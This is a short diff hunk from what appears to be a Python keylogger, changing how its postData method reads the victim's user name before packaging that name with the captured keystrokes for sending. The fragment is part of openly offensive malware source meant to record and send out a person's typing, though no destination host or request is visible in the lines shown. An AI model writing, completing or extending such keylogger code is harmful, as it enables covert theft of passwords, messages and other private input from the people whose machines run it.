@@ -95,7 +95,7 @@ class Keylogger:
 
     def postData(self):
         
-        name = os.environ['USERPROFILE']
+        name = os.getenv('username')
         data = {
             'user' : name,
             'keystroke'  : "~".join(self.log),
